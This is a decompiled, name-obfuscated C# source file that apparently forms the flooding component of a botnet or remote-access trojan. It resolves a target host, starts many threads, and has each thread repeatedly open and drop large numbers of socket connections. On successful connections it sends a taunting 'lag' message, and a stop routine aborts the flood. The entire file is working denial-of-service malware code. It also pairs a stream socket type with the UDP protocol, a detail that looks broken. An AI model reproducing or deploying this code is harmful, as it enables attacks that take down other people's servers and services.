using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

internal sealed class Class13
{
	private sealed class Class14
	{
		private Socket[] socket_0;

		private IPEndPoint ipendPoint_0;

		private int int_0;

		public Class14(IPEndPoint ipendPoint_1, int int_1)
		{
			ipendPoint_0 = ipendPoint_1;
			int_0 = int_1;
		}

		private static void smethod_0(IAsyncResult iasyncResult_0)
		{
		}

		public void method_0()
		{
			checked
			{
				while (true)
				{
					try
					{
						socket_0 = new Socket[int_0 - 1 + 1];
						int num = int_0 - 1;
						for (int i = 0; i <= num; i++)
						{
							socket_0[i] = new Socket(ipendPoint_0.AddressFamily, SocketType.Stream, ProtocolType.Udp);
							socket_0[i].Blocking = false;
							socket_0[i].BeginConnect(ipendPoint_0, smethod_0, socket_0[i]);
						}
						Thread.Sleep(100);
						int num2 = int_0 - 1;
						for (int i = 0; i <= num2; i++)
						{
							if (socket_0[i].Connected)
							{
								socket_0[i].Disconnect(reuseSocket: false);
							}
							socket_0[i].Close();
							socket_0[i] = null;
						}
						socket_0 = null;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						int num3 = int_0 - 1;
						for (int i = 0; i <= num3; i++)
						{
							try
							{
								if (socket_0 != null)
								{
									if (socket_0[i].Connected)
									{
										byte[] bytes = Encoding.UTF8.GetBytes("Hello server! Wanna lag a little please?");
										socket_0[i].Send(bytes, 0, bytes.Length, SocketFlags.None);
										socket_0[i].Disconnect(reuseSocket: false);
									}
									socket_0[i].Close();
									socket_0[i] = null;
								}
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_0;

	private static IPEndPoint ipendPoint_0;

	private static Class14[] class14_0;

	public static string string_0;

	public static bool bool_0;

	public static int int_0;

	public static int int_1;

	public static int int_2;

	public static void smethod_0()
	{
		try
		{
			IPAddress[] addressList = Dns.GetHostEntry(string_0).AddressList;
			ipendPoint_0 = new IPEndPoint(addressList[0], int_0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			IPAddress address = IPAddress.Parse(string_0);
			ipendPoint_0 = new IPEndPoint(address, int_0);
			ProjectData.ClearProjectError();
		}
		checked
		{
			thread_0 = new Thread[int_2 - 1 + 1];
			threadStart_0 = new ThreadStart[int_2 - 1 + 1];
			class14_0 = new Class14[int_2 - 1 + 1];
			int num = int_2 - 1;
			for (int i = 0; i <= num; i++)
			{
				class14_0[i] = new Class14(ipendPoint_0, int_1);
				threadStart_0[i] = class14_0[i].method_0;
				thread_0[i] = new Thread(threadStart_0[i]);
				thread_0[i].Start();
			}
			bool_0 = true;
		}
	}

	public static void smethod_1()
	{
		checked
		{
			int num = int_2 - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					thread_0[i].Abort();
					thread_0[i] = null;
					threadStart_0[i] = null;
					class14_0[i] = null;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			bool_0 = false;
		}
	}
}
